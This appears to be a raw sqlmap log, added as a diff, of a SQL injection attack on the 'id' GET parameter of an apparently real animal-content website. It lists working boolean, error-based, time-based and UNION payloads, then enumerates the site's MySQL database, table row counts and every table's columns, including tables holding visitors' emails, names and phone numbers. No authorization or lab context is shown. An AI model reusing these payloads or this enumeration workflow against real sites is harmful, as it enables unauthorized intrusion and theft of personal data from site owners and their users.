@@ -1,0 +1,839 @@
+sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25822 AND 4371=4371
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=25822 OR (SELECT 5976 FROM(SELECT COUNT(*),CONCAT(0x7178707671,(SELECT (ELT(5976=5976,1))),0x717a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25822 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: id=-9077 UNION ALL SELECT CONCAT(0x7178707671,0x5851734859536f68586c747267636e614e5142497a48665652505043486469586e514c4175444967,0x717a786a71)-- VOkd
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] conteud2_conteudoanimal
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25822 AND 4371=4371
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=25822 OR (SELECT 5976 FROM(SELECT COUNT(*),CONCAT(0x7178707671,(SELECT (ELT(5976=5976,1))),0x717a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25822 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: id=-9077 UNION ALL SELECT CONCAT(0x7178707671,0x5851734859536f68586c747267636e614e5142497a48665652505043486469586e514c4175444967,0x717a786a71)-- VOkd
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+Database: conteud2_conteudoanimal
+[49 tables]
++----------------------+
+| RedesSociais         |
+| adsense              |
+| anfibios             |
+| aplicativo           |
+| aranhas              |
+| banner               |
+| caes                 |
+| canalyoutube         |
+| cavalos              |
+| chines               |
+| cidades              |
+| cinema               |
+| cobras               |
+| coelho               |
+| colunas              |
+| contato              |
+| cotidiano            |
+| curriculo            |
+| dinheiro             |
+| divulgacaoposts      |
+| encurta              |
+| faq                  |
+| feedpeixes           |
+| gatos                |
+| hamsters             |
+| hospedagem           |
+| letras               |
+| livros               |
+| logs                 |
+| mascote              |
+| noticias             |
+| passaros             |
+| peixes               |
+| pesquisa             |
+| petnomes             |
+| pinturas             |
+| pokemon              |
+| precos               |
+| remedios             |
+| stats                |
+| sugestao             |
+| tartarugas           |
+| telefones            |
+| universidade         |
+| variavel             |
+| vcard                |
+| videosinstitucionais |
+| viewpeixes           |
+| visitado             |
++----------------------+
+
+Database: conteud2_conteudoanimal
++----------------------+---------+
+| Table                | Entries |
++----------------------+---------+
+| encurta              | 24740   |
+| noticias             | 24652   |
+| colunas              | 969     |
+| pokemon              | 791     |
+| petnomes             | 590     |
+| letras               | 410     |
+| caes                 | 261     |
+| canalyoutube         | 171     |
+| cinema               | 149     |
+| cidades              | 144     |
+| passaros             | 133     |
+| peixes               | 115     |
+| stats                | 103     |
+| universidade         | 96      |
+| mascote              | 94      |
+| cavalos              | 67      |
+| gatos                | 55      |
+| livros               | 53      |
+| cobras               | 42      |
+| cotidiano            | 41      |
+| aranhas              | 36      |
+| adsense              | 34      |
+| anfibios             | 27      |
+| tartarugas           | 26      |
+| coelho               | 14      |
+| faq                  | 13      |
+| chines               | 12      |
+| banner               | 9       |
+| dinheiro             | 7       |
+| aplicativo           | 6       |
+| logs                 | 6       |
+| precos               | 6       |
+| videosinstitucionais | 5       |
+| hamsters             | 4       |
+| curriculo            | 2       |
+| visitado             | 1       |
++----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=25822 AND 4371=4371
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=25822 OR (SELECT 5976 FROM(SELECT COUNT(*),CONCAT(0x7178707671,(SELECT (ELT(5976=5976,1))),0x717a786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=25822 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: id=-9077 UNION ALL SELECT CONCAT(0x7178707671,0x5851734859536f68586c747267636e614e5142497a48665652505043486469586e514c4175444967,0x717a786a71)-- VOkd
+    Vector:  UNION ALL SELECT [QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Nginx
+back-end DBMS: MySQL >= 5.0
+Database: conteud2_conteudoanimal
+[49 tables]
++----------------------+
+| RedesSociais         |
+| adsense              |
+| anfibios             |
+| aplicativo           |
+| aranhas              |
+| banner               |
+| caes                 |
+| canalyoutube         |
+| cavalos              |
+| chines               |
+| cidades              |
+| cinema               |
+| cobras               |
+| coelho               |
+| colunas              |
+| contato              |
+| cotidiano            |
+| curriculo            |
+| dinheiro             |
+| divulgacaoposts      |
+| encurta              |
+| faq                  |
+| feedpeixes           |
+| gatos                |
+| hamsters             |
+| hospedagem           |
+| letras               |
+| livros               |
+| logs                 |
+| mascote              |
+| noticias             |
+| passaros             |
+| peixes               |
+| pesquisa             |
+| petnomes             |
+| pinturas             |
+| pokemon              |
+| precos               |
+| remedios             |
+| stats                |
+| sugestao             |
+| tartarugas           |
+| telefones            |
+| universidade         |
+| variavel             |
+| vcard                |
+| videosinstitucionais |
+| viewpeixes           |
+| visitado             |
++----------------------+
+
+Database: conteud2_conteudoanimal
+Table: telefones
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| evento | varchar(255) |
+| id     | int(11)      |
+| nome   | varchar(255) |
+| numero | int(11)      |
++--------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: logs
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| atualizacao | text         |
+| data        | timestamp    |
+| id          | int(11)      |
+| onde        | varchar(255) |
+| titulo      | varchar(256) |
++-------------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: precos
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(11)      |
+| objeto | varchar(256) |
+| tipo   | varchar(256) |
+| valor  | int(11)      |
++--------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: cinema
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| publicado | timestamp    |
+| sinopse   | text         |
+| titulo    | varchar(256) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: RedesSociais
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| nome      | varchar(100) |
+| publicado | timestamp    |
+| url       | varchar(255) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: divulgacaoposts
+[2 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(11)      |
+| texto  | varchar(270) |
++--------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: colunas
+[6 columns]
++-----------+---------------+
+| Column    | Type          |
++-----------+---------------+
+| autor     | varchar(1000) |
+| id        | int(10)       |
+| publicado | timestamp     |
+| texto     | longtext      |
+| titulo    | varchar(255)  |
+| visitas   | int(11)       |
++-----------+---------------+
+
+Database: conteud2_conteudoanimal
+Table: noticias
+[6 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| fonte     | text         |
+| id        | int(10)      |
+| manchete  | varchar(255) |
+| noticia   | text         |
+| publicado | timestamp    |
+| visitas   | int(11)      |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: livros
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| autor     | varchar(255) |
+| id        | int(10)      |
+| publicado | timestamp    |
+| resenha   | longtext     |
+| titulo    | varchar(255) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: cotidiano
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | text         |
+| fato      | varchar(255) |
+| id        | int(11)      |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: hospedagem
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| nome      | varchar(100) |
+| publicado | timestamp    |
+| url       | varchar(200) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: pokemon
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | text         |
+| foto      | varchar(255) |
+| id        | int(11)      |
+| nome      | varchar(255) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: universidade
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| link      | text         |
+| nome      | varchar(300) |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: encurta
+[4 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| final  | varchar(600) |
+| id     | int(11)      |
+| url    | varchar(300) |
+| url2   | varchar(300) |
++--------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: cobras
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: dinheiro
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| animal    | varchar(255) |
+| id        | int(11)      |
+| origem    | varchar(255) |
+| publicado | timestamp    |
+| valor     | int(11)      |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: variavel
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| id     | int(11)      |
+| nome   | varchar(255) |
+| valor  | varchar(255) |
++--------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: stats
+[6 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| ano       | varchar(4)  |
+| id        | int(11)     |
+| leitores  | int(11)     |
+| mes       | varchar(12) |
+| paginas   | int(11)     |
+| publicado | timestamp   |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: tartarugas
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: mascote
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| time      | varchar(255) |
+| evento    | varchar(255) |
+| id        | int(11)      |
+| nome      | varchar(255) |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: hamsters
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: cidades
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| descricao | text         |
+| id        | int(11)      |
+| nome      | varchar(255) |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: sugestao
+[4 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| contato | varchar(255) |
+| email   | varchar(255) |
+| id      | int(11)      |
+| texto   | text         |
++---------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: anfibios
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: adsense
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| local     | varchar(10)  |
+| canal     | varchar(500) |
+| codigo    | mediumtext   |
+| id        | int(11)      |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: caes
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: pesquisa
+[4 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| comentarios | text         |
+| email       | varchar(255) |
+| id          | int(11)      |
+| nome        | varchar(255) |
++-------------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: aplicativo
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| app       | varchar(256) |
+| id        | int(11)      |
+| link      | varchar(256) |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: cavalos
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: chines
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| bicho     | varchar(255) |
+| descricao | text         |
+| id        | int(11)      |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: faq
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| pergunta  | varchar(256) |
+| publicado | timestamp    |
+| resposta  | text         |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: videosinstitucionais
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| link      | varchar(500) |
+| publicado | timestamp    |
+| titulo    | varchar(500) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: passaros
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: remedios
+[4 columns]
++------------+--------------+
+| Column     | Type         |
++------------+--------------+
+| bula       | text         |
+| fabricante | text         |
+| id         | int(11)      |
+| nome       | varchar(255) |
++------------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: visitado
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| comentarios | text         |
+| email       | varchar(255) |
+| id          | int(11)      |
+| nome        | varchar(255) |
+| publicado   | timestamp    |
++-------------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: banner
+[8 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| app       | text         |
+| ativo     | char(1)      |
+| id        | int(11)      |
+| imagem    | varchar(50)  |
+| link      | varchar(140) |
+| nome      | varchar(140) |
+| publicado | timestamp    |
+| twitter   | char(255)    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: vcard
+[4 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| email    | varchar(256) |
+| id       | int(11)      |
+| Nome     | varchar(256) |
+| telefone | bigint(20)   |
++----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: viewpeixes
+[2 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| arquivo | varchar(50) |
+| raca    | varchar(50) |
++---------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: gatos
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: petnomes
+[3 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| nome      | varchar(256) |
+| publicado | timestamp    |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: pinturas
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(10)      |
+| musica    | longtext     |
+| musicos   | varchar(255) |
+| publicado | timestamp    |
+| titulo    | varchar(255) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: feedpeixes
+[2 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| arquivo | varchar(50) |
+| raca    | varchar(50) |
++---------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: contato
+[5 columns]
++-------------+--------------+
+| Column      | Type         |
++-------------+--------------+
+| comentarios | text         |
+| email       | varchar(255) |
+| id          | int(11)      |
+| nome        | varchar(255) |
+| publicado   | timestamp    |
++-------------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: coelho
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | text        |
+| arquivo   | varchar(50) |
+| id        | int(11)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: aranhas
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: peixes
+[5 columns]
++-----------+-------------+
+| Column    | Type        |
++-----------+-------------+
+| animal    | longtext    |
+| arquivo   | varchar(50) |
+| id        | int(10)     |
+| publicado | timestamp   |
+| raca      | varchar(50) |
++-----------+-------------+
+
+Database: conteud2_conteudoanimal
+Table: curriculo
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| link      | varchar(256) |
+| publicado | timestamp    |
+| titulo    | varchar(256) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: canalyoutube
+[4 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(11)      |
+| link      | varchar(300) |
+| publicado | timestamp    |
+| titulo    | varchar(400) |
++-----------+--------------+
+
+Database: conteud2_conteudoanimal
+Table: letras
+[5 columns]
++-----------+--------------+
+| Column    | Type         |
++-----------+--------------+
+| id        | int(10)      |
+| musica    | longtext     |
+| musicos   | varchar(255) |
+| publicado | timestamp    |
+| titulo    | varchar(255) |
++-----------+--------------+
+
